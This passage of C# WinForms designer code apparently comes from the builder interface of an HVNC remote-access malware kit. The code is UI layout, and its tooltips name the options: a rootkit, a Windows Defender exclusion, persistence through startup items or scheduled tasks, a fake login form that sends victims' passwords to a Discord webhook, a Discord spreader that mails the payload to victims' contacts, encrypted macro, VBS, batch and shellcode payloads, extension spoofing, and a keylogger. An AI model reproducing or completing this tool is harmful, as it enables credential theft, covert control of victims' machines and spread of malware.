            this.chkAdvanceBotK.Size = new System.Drawing.Size(50, 19);
            this.chkAdvanceBotK.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkAdvanceBotK.TabIndex = 108;
            this.toolTip1.SetToolTip(this.chkAdvanceBotK, "Advance Virus Remover to run on hidden desktop!");
            // 
            // label28
            // 
            this.label28.AutoSize = true;
            this.label28.Location = new System.Drawing.Point(146, 73);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(58, 13);
            this.label28.TabIndex = 107;
            this.label28.Text = "Ccleaner";
            this.toolTip1.SetToolTip(this.label28, "Advance Virus Remover to run on hidden desktop!");
            // 
            // chkBotK
            // 
            this.chkBotK.BackColor = System.Drawing.Color.Transparent;
            this.chkBotK.Location = new System.Drawing.Point(390, 70);
            this.chkBotK.Name = "chkBotK";
            this.chkBotK.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBotK.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBotK.Size = new System.Drawing.Size(50, 19);
            this.chkBotK.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkBotK.TabIndex = 106;
            this.toolTip1.SetToolTip(this.chkBotK, "This will kill existing viruses to make HVNC faster!");
            // 
            // label27
            // 
            this.label27.AutoSize = true;
            this.label27.Location = new System.Drawing.Point(441, 73);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(59, 13);
            this.label27.TabIndex = 105;
            this.label27.Text = "Bot Killer";
            this.toolTip1.SetToolTip(this.label27, "This will kill existing viruses to make HVNC faster!");
            // 
            // chkVBS
            // 
            this.chkVBS.BackColor = System.Drawing.Color.Transparent;
            this.chkVBS.Location = new System.Drawing.Point(696, 336);
            this.chkVBS.Name = "chkVBS";
            this.chkVBS.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkVBS.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkVBS.Size = new System.Drawing.Size(50, 19);
            this.chkVBS.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkVBS.TabIndex = 104;
            this.toolTip1.SetToolTip(this.chkVBS, "This will generate a .vbs payload!");
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.Location = new System.Drawing.Point(747, 339);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(46, 13);
            this.label26.TabIndex = 103;
            this.label26.Text = "As Vbs";
            this.toolTip1.SetToolTip(this.label26, "This will generate a .vbs payload!");
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(292, 73);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(47, 13);
            this.label11.TabIndex = 63;
            this.label11.Text = "Rootkit";
            this.toolTip1.SetToolTip(this.label11, "Rootkit will hide your hvnc process/file/registry/socket to make it harder to rem" +
        "ove!");
            // 
            // chkUCA
            // 
            this.chkUCA.BackColor = System.Drawing.Color.Transparent;
            this.chkUCA.Location = new System.Drawing.Point(242, 70);
            this.chkUCA.Name = "chkUCA";
            this.chkUCA.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkUCA.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkUCA.Size = new System.Drawing.Size(50, 19);
            this.chkUCA.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkUCA.TabIndex = 62;
            this.toolTip1.SetToolTip(this.chkUCA, "Rootkit will hide your hvnc process/file/registry/socket to make it harder to rem" +
        "ove!");
            // 
            // chkWDEX
            // 
            this.chkWDEX.BackColor = System.Drawing.Color.Transparent;
            this.chkWDEX.Location = new System.Drawing.Point(390, 39);
            this.chkWDEX.Name = "chkWDEX";
            this.chkWDEX.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkWDEX.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkWDEX.Size = new System.Drawing.Size(50, 19);
            this.chkWDEX.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkWDEX.TabIndex = 39;
            this.toolTip1.SetToolTip(this.chkWDEX, "This will add a exclusion to Windows Defender!");
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(441, 42);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(60, 13);
            this.label2.TabIndex = 34;
            this.label2.Text = "Exclusion";
            this.toolTip1.SetToolTip(this.label2, "This will add a exclusion to Windows Defender!");
            // 
            // chkMacro
            // 
            this.chkMacro.BackColor = System.Drawing.Color.Transparent;
            this.chkMacro.Location = new System.Drawing.Point(410, 336);
            this.chkMacro.Name = "chkMacro";
            this.chkMacro.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkMacro.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkMacro.Size = new System.Drawing.Size(50, 19);
            this.chkMacro.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkMacro.TabIndex = 100;
            this.toolTip1.SetToolTip(this.chkMacro, "This will generate a macro to add on your word document!");
            this.chkMacro.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.toggleSwitch1_CheckedChanged_1);
            // 
            // chkObf
            // 
            this.chkObf.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.chkObf.BackColor = System.Drawing.Color.Transparent;
            this.chkObf.Location = new System.Drawing.Point(271, 255);
            this.chkObf.Name = "chkObf";
            this.chkObf.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkObf.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkObf.Size = new System.Drawing.Size(50, 19);
            this.chkObf.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkObf.TabIndex = 90;
            this.toolTip1.SetToolTip(this.chkObf, "Encrypt your macro output!");
            this.chkObf.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkObf_CheckedChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(146, 42);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(49, 13);
            this.label1.TabIndex = 33;
            this.label1.Text = "Startup";
            this.toolTip1.SetToolTip(this.label1, "This will add startup item for persistence,if you run payload as admin it will ad" +
        "d a shedule task or ");
            // 
            // label16
            // 
            this.label16.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.label16.AutoSize = true;
            this.label16.Location = new System.Drawing.Point(327, 258);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(88, 13);
            this.label16.TabIndex = 91;
            this.label16.Text = "Encrypt Macro";
            this.toolTip1.SetToolTip(this.label16, "Encrypt your macro output!");
            // 
            // label20
            // 
            this.label20.AutoSize = true;
            this.label20.Location = new System.Drawing.Point(461, 339);
            this.label20.Name = "label20";
            this.label20.Size = new System.Drawing.Size(59, 13);
            this.label20.TabIndex = 99;
            this.label20.Text = "As Macro";
            this.toolTip1.SetToolTip(this.label20, "You can use this with word documents as macro!");
            // 
            // chkStartup
            // 
            this.chkStartup.BackColor = System.Drawing.Color.Transparent;
            this.chkStartup.Location = new System.Drawing.Point(94, 39);
            this.chkStartup.Name = "chkStartup";
            this.chkStartup.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkStartup.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkStartup.Size = new System.Drawing.Size(50, 19);
            this.chkStartup.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkStartup.TabIndex = 38;
            this.toolTip1.SetToolTip(this.chkStartup, "This will add startup item for persistence,if you run payload as admin it will ad" +
        "d a shedule task or \r\nif you run the payload as normal user then it will add a s" +
        "tartup shortcut!");
            // 
            // chkFakeLogin
            // 
            this.chkFakeLogin.BackColor = System.Drawing.Color.Transparent;
            this.chkFakeLogin.Location = new System.Drawing.Point(538, 39);
            this.chkFakeLogin.Name = "chkFakeLogin";
            this.chkFakeLogin.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkFakeLogin.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkFakeLogin.Size = new System.Drawing.Size(50, 19);
            this.chkFakeLogin.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkFakeLogin.TabIndex = 98;
            this.toolTip1.SetToolTip(this.chkFakeLogin, "This will open a fake login form that will store bots windows username and passwo" +
        "rd and send it\r\nfrom discord webhook!");
            this.chkFakeLogin.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkFakeLogin_CheckedChanged);
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(293, 42);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(53, 13);
            this.label6.TabIndex = 40;
            this.label6.Text = "Watcher";
            this.toolTip1.SetToolTip(this.label6, "Watcher will restart the hvnc process if it get killed from task manager!");
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.Location = new System.Drawing.Point(589, 42);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(67, 13);
            this.label19.TabIndex = 97;
            this.label19.Text = "Fake Login";
            this.toolTip1.SetToolTip(this.label19, "This will open a fake login form that will store victems \r\nusername and password " +
        "and it to the given webhook!");
            // 
            // chkWatcher
            // 
            this.chkWatcher.BackColor = System.Drawing.Color.Transparent;
            this.chkWatcher.Location = new System.Drawing.Point(242, 39);
            this.chkWatcher.Name = "chkWatcher";
            this.chkWatcher.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkWatcher.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkWatcher.Size = new System.Drawing.Size(50, 19);
            this.chkWatcher.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkWatcher.TabIndex = 42;
            this.toolTip1.SetToolTip(this.chkWatcher, "Watcher will restart the hvnc process if it get killed from task manager!");
            // 
            // chkBin
            // 
            this.chkBin.BackColor = System.Drawing.Color.Transparent;
            this.chkBin.Location = new System.Drawing.Point(553, 336);
            this.chkBin.Name = "chkBin";
            this.chkBin.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBin.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBin.Size = new System.Drawing.Size(50, 19);
            this.chkBin.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkBin.TabIndex = 43;
            this.toolTip1.SetToolTip(this.chkBin, "This will generate a shellcode .bin file!");
            // 
            // chkBatch
            // 
            this.chkBatch.BackColor = System.Drawing.Color.Transparent;
            this.chkBatch.Location = new System.Drawing.Point(271, 336);
            this.chkBatch.Name = "chkBatch";
            this.chkBatch.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBatch.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkBatch.Size = new System.Drawing.Size(50, 19);
            this.chkBatch.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkBatch.TabIndex = 64;
            this.toolTip1.SetToolTip(this.chkBatch, "This will generate a batch payload !");
            this.chkBatch.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkBatch_CheckedChanged);
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(327, 339);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(57, 13);
            this.label10.TabIndex = 65;
            this.label10.Text = "As Batch";
            this.toolTip1.SetToolTip(this.label10, "This will generate a batch payload !");
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(604, 339);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(80, 13);
            this.label4.TabIndex = 41;
            this.label4.Text = "As Shellcode";
            this.toolTip1.SetToolTip(this.label4, "This will generate a shellcode .bin file!");
            // 
            // label21
            // 
            this.label21.AutoSize = true;
            this.label21.Location = new System.Drawing.Point(268, 228);
            this.label21.Name = "label21";
            this.label21.Size = new System.Drawing.Size(93, 13);
            this.label21.TabIndex = 112;
            this.label21.Text = "Macro Options:";
            this.toolTip1.SetToolTip(this.label21, "You can use this with word documents as macro!");
            // 
            // label32
            // 
            this.label32.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label32.AutoSize = true;
            this.label32.Location = new System.Drawing.Point(589, 73);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(107, 13);
            this.label32.TabIndex = 114;
            this.label32.Text = "Discord Spreader";
            this.toolTip1.SetToolTip(this.label32, "This will spread your payload on all discord users from victem discord contact li" +
        "st!");
            // 
            // chkSpread
            // 
            this.chkSpread.BackColor = System.Drawing.Color.Transparent;
            this.chkSpread.Location = new System.Drawing.Point(538, 70);
            this.chkSpread.Name = "chkSpread";
            this.chkSpread.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkSpread.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkSpread.Size = new System.Drawing.Size(50, 19);
            this.chkSpread.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkSpread.TabIndex = 115;
            this.toolTip1.SetToolTip(this.chkSpread, "This will spread your payload on all discord users from victem discord contact li" +
        "st!");
            this.chkSpread.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkSpread_CheckedChanged);
            // 
            // primeButton4
            // 
            this.primeButton4.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom12.Name = "DownGradient1";
            bloom12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom13.Name = "DownGradient2";
            bloom13.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom14.Name = "NoneGradient1";
            bloom14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom15.Name = "NoneGradient2";
            bloom15.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom16.Name = "NoneGradient3";
            bloom16.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom17.Name = "NoneGradient4";
            bloom17.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom18.Name = "Glow";
            bloom18.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.White;
            bloom20.Name = "Text";
            bloom20.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom21.Name = "Border1";
            bloom21.Value = System.Drawing.Color.White;
            bloom22.Name = "Border2";
            bloom22.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.primeButton4.Colors = new ShitarusPrivate.Bloom[] {
        bloom12,
        bloom13,
        bloom14,
        bloom15,
        bloom16,
        bloom17,
        bloom18,
        bloom19,
        bloom20,
        bloom21,
        bloom22};
            this.primeButton4.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton4.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.primeButton4.Image = null;
            this.primeButton4.Location = new System.Drawing.Point(151, 317);
            this.primeButton4.Name = "primeButton4";
            this.primeButton4.NoRounding = false;
            this.primeButton4.Size = new System.Drawing.Size(71, 30);
            this.primeButton4.TabIndex = 113;
            this.primeButton4.Text = "Browse";
            this.toolTip1.SetToolTip(this.primeButton4, "Add a payload!");
            this.primeButton4.Transparent = false;
            this.primeButton4.Click += new System.EventHandler(this.primeButton4_Click);
            // 
            // txtDiscFilePath
            // 
            this.txtDiscFilePath.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtDiscFilePath.Enabled = false;
            this.txtDiscFilePath.Location = new System.Drawing.Point(233, 317);
            this.txtDiscFilePath.Multiline = true;
            this.txtDiscFilePath.Name = "txtDiscFilePath";
            this.txtDiscFilePath.Size = new System.Drawing.Size(440, 30);
            this.txtDiscFilePath.TabIndex = 112;
            this.txtDiscFilePath.Text = "File to Spread on discord";
            this.toolTip1.SetToolTip(this.txtDiscFilePath, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // txtDiscordFilename
            // 
            this.txtDiscordFilename.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtDiscordFilename.Enabled = false;
            this.txtDiscordFilename.Location = new System.Drawing.Point(233, 353);
            this.txtDiscordFilename.Multiline = true;
            this.txtDiscordFilename.Name = "txtDiscordFilename";
            this.txtDiscordFilename.Size = new System.Drawing.Size(402, 30);
            this.txtDiscordFilename.TabIndex = 116;
            this.txtDiscordFilename.Text = "Filename of discord file";
            this.toolTip1.SetToolTip(this.txtDiscordFilename, "Filename for the file you want to spread!");
            // 
            // txtDiscMessage
            // 
            this.txtDiscMessage.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtDiscMessage.Enabled = false;
            this.txtDiscMessage.Location = new System.Drawing.Point(233, 389);
            this.txtDiscMessage.Multiline = true;
            this.txtDiscMessage.Name = "txtDiscMessage";
            this.txtDiscMessage.Size = new System.Drawing.Size(440, 117);
            this.txtDiscMessage.TabIndex = 117;
            this.txtDiscMessage.Text = "Message to add along with the file!";
            this.toolTip1.SetToolTip(this.txtDiscMessage, "Add here the message you want to send to all user along with the file!");
            // 
            // chkExecS
            // 
            this.chkExecS.BackColor = System.Drawing.Color.Transparent;
            this.chkExecS.Checked = true;
            this.chkExecS.Location = new System.Drawing.Point(570, 80);
            this.chkExecS.Name = "chkExecS";
            this.chkExecS.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkExecS.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkExecS.Size = new System.Drawing.Size(50, 19);
            this.chkExecS.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkExecS.TabIndex = 117;
            this.toolTip1.SetToolTip(this.chkExecS, "Run Payload!");
            // 
            // label36
            // 
            this.label36.AutoSize = true;
            this.label36.Location = new System.Drawing.Point(621, 83);
            this.label36.Name = "label36";
            this.label36.Size = new System.Drawing.Size(101, 13);
            this.label36.TabIndex = 116;
            this.label36.Text = "Execute Payload";
            this.toolTip1.SetToolTip(this.label36, "Run Payload!");
            // 
            // txtUrl
            // 
            this.txtUrl.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtUrl.Location = new System.Drawing.Point(307, 265);
            this.txtUrl.Multiline = true;
            this.txtUrl.Name = "txtUrl";
            this.txtUrl.Size = new System.Drawing.Size(440, 30);
            this.txtUrl.TabIndex = 113;
            this.txtUrl.Text = "Payload URL";
            this.toolTip1.SetToolTip(this.txtUrl, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // txtIconPath
            // 
            this.txtIconPath.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtIconPath.Location = new System.Drawing.Point(307, 229);
            this.txtIconPath.Multiline = true;
            this.txtIconPath.Name = "txtIconPath";
            this.txtIconPath.Size = new System.Drawing.Size(358, 30);
            this.txtIconPath.TabIndex = 114;
            this.txtIconPath.Text = "Picture Path";
            this.toolTip1.SetToolTip(this.txtIconPath, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // chkSpoof
            // 
            this.chkSpoof.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.chkSpoof.BackColor = System.Drawing.Color.Transparent;
            this.chkSpoof.Location = new System.Drawing.Point(400, 367);
            this.chkSpoof.Name = "chkSpoof";
            this.chkSpoof.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkSpoof.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkSpoof.Size = new System.Drawing.Size(50, 19);
            this.chkSpoof.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkSpoof.TabIndex = 102;
            this.toolTip1.SetToolTip(this.chkSpoof, "Extention Spoofer");
            this.chkSpoof.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkSpoof_CheckedChanged);
            // 
            // label37
            // 
            this.label37.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label37.AutoSize = true;
            this.label37.Location = new System.Drawing.Point(452, 370);
            this.label37.Name = "label37";
            this.label37.Size = new System.Drawing.Size(109, 13);
            this.label37.TabIndex = 103;
            this.label37.Text = "Extention Spoofer";
            this.toolTip1.SetToolTip(this.label37, "Extention Spoofer");
            // 
            // txtSname
            // 
            this.txtSname.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtSname.Location = new System.Drawing.Point(307, 301);
            this.txtSname.Multiline = true;
            this.txtSname.Name = "txtSname";
            this.txtSname.Size = new System.Drawing.Size(440, 30);
            this.txtSname.TabIndex = 118;
            this.txtSname.Text = "Shortcut Name";
            this.toolTip1.SetToolTip(this.txtSname, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // txtSdesc
            // 
            this.txtSdesc.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtSdesc.Location = new System.Drawing.Point(307, 337);
            this.txtSdesc.Multiline = true;
            this.txtSdesc.Name = "txtSdesc";
            this.txtSdesc.Size = new System.Drawing.Size(440, 30);
            this.txtSdesc.TabIndex = 119;
            this.txtSdesc.Text = "Description";
            this.toolTip1.SetToolTip(this.txtSdesc, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // chkKlogger
            // 
            this.chkKlogger.BackColor = System.Drawing.Color.Transparent;
            this.chkKlogger.Location = new System.Drawing.Point(94, 102);
            this.chkKlogger.Name = "chkKlogger";
            this.chkKlogger.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkKlogger.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkKlogger.Size = new System.Drawing.Size(50, 19);
            this.chkKlogger.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkKlogger.TabIndex = 116;
            this.toolTip1.SetToolTip(this.chkKlogger, "Keylogger for Hvnc Panel!");
            this.chkKlogger.Visible = false;
            // 
            // label22
            // 
            this.label22.AutoSize = true;
            this.label22.Location = new System.Drawing.Point(146, 105);
            this.label22.Name = "label22";
            this.label22.Size = new System.Drawing.Size(65, 13);
            this.label22.TabIndex = 117;
            this.label22.Text = "Keylogger";
            this.toolTip1.SetToolTip(this.label22, "Keylogger for Hvnc Panel!");
            this.label22.Visible = false;
            // 
            // label23
            // 
            this.label23.AutoSize = true;
            this.label23.Location = new System.Drawing.Point(294, 105);
            this.label23.Name = "label23";
            this.label23.Size = new System.Drawing.Size(72, 13);
            this.label23.TabIndex = 119;
            this.label23.Text = "Clip Logger";
            this.toolTip1.SetToolTip(this.label23, "Clipboard Logger for Hvnc Panel!");
            this.label23.Visible = false;
            // 
            // chkClogger
            // 
            this.chkClogger.BackColor = System.Drawing.Color.Transparent;
            this.chkClogger.Location = new System.Drawing.Point(242, 102);
            this.chkClogger.Name = "chkClogger";
            this.chkClogger.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClogger.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkClogger.Size = new System.Drawing.Size(50, 19);
            this.chkClogger.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkClogger.TabIndex = 118;
            this.toolTip1.SetToolTip(this.chkClogger, "Clipboard Logger for Hvnc Panel!");
            this.chkClogger.Visible = false;
            // 
            // toggleSwitch1
            // 
            this.toggleSwitch1.BackColor = System.Drawing.Color.Transparent;
            this.toggleSwitch1.Enabled = false;
            this.toggleSwitch1.Location = new System.Drawing.Point(390, 102);
            this.toggleSwitch1.Name = "toggleSwitch1";
            this.toggleSwitch1.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toggleSwitch1.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toggleSwitch1.Size = new System.Drawing.Size(50, 19);
            this.toggleSwitch1.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.toggleSwitch1.TabIndex = 120;
            this.toolTip1.SetToolTip(this.toggleSwitch1, "This is remote desktop to watch what the user does on his desktop!");
            this.toggleSwitch1.Visible = false;
            // 
            // label24
            // 
            this.label24.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label24.AutoSize = true;
            this.label24.Enabled = false;
            this.label24.Location = new System.Drawing.Point(446, 105);
            this.label24.Name = "label24";
            this.label24.Size = new System.Drawing.Size(77, 13);
            this.label24.TabIndex = 121;
            this.label24.Text = "Screenshots";
            this.toolTip1.SetToolTip(this.label24, "This is remote desktop to watch what the user does on his desktop!");
            this.label24.Visible = false;
            // 
            // btnBinderBrowse
            // 
            this.btnBinderBrowse.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom23.Name = "DownGradient1";
            bloom23.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom24.Name = "DownGradient2";
            bloom24.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom25.Name = "NoneGradient1";
